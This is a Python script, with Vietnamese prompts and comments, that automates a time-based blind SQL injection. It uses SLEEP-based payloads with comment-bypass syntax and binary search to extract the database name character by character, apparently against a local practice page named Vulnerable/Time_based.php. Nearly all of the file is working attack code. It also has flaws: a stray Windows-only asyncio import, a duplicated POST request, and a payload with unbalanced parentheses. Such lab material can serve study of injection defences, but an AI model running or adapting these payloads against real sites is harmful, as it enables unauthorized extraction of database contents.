
import ast
from asyncio.windows_events import NULL
import re
from prettytable import PrettyTable
import requests



def inject (lower_bound_orig=32, upper_bound_orig=126, length=5):
    result=''
    for i in range(1, length+1):
        lower_bound = lower_bound_orig
        upper_bound = upper_bound_orig
        # payload = "'or/**/if(ascii((substring(database(),1,1)))>'f',SLEEP(5),null)#"
        payload = "'or/**/if(substring(database(),%d,1))[COND]'[CHAR]',SLEEP(5),null)#" %(i)
        # payload = 'off)/**/or/**/or(select ascii(substring((%s),%d)))[COND][CHAR]%%23' %(query, i)
        while lower_bound <= upper_bound:
            middle = lower_bound + (upper_bound-lower_bound) // 2
            payloadEqual = payload.replace('[COND]','=').replace('[CHAR]', chr(middle))
            print(payloadEqual)
            if send_payload(payloadEqual) == True:
                result += chr(middle)
                print(chr(middle), end='', flush=True)
                break
            payloadLower = payload.replace('[COND]','>').replace('[CHAR]', chr(middle))
            print(payloadLower)
            if send_payload(payloadLower) == True:
                lower_bound = middle + 1
            else:
                upper_bound = middle - 1
        else:
            result += "_"
    print()
    return result


def send_payload(payload):
    url = 'http://localhost:8082/Vulnerable/Time_based.php'
    data = {'title':payload, 'action':'search'}
    # t = PrettyTable(['Key', 'Value'])
    # for key,value in data.items():
    #      t.add_row([key, value])
    # print(t)
    # possion_payload = input("\t==>Vị trí payload: ")
    # data[possion_payload] = payload
    r = requests.get(url, data)
    if int(r.elapsed.total_seconds()) > 5:
        return True
    else:
        return False
def make_request(url, method='GET', data={},json={}):
    if method.upper()=='GET':
        r = requests.get(url, data)
    elif method.upper()=='POST':
        if bool(json):
                r = requests.post(url, data, json)
        r = requests.post(url, data)
    else:
        print('Oh come on')
    return r.text

def create_data():
    data = dict()
    print('[+] Xác định data: ')
    while(True):
        key = input("\tKey: ")
        data[key] = input("\tValue: ")
        print("-----------------------------------")
        exit = input("Do you want to quit [y/n]: ")
        if(exit.upper()=='Y'or exit.upper()=='YES'):
            break
    return data

# try:

#     # data = dict();data_input = input('Data của mục tiêu {"key": value}==> ');data = ast.literal_eval(data_input)
#     # print(type(data))
# except:
#     print("Có lỗi xảy ra, hãy kiểm tra lại input của mình")
value = inject()
# value = send_payload("'or/**/if(ascii((substring(database(),1,1)))>'f',SLEEP(5),null)#")
print(value)
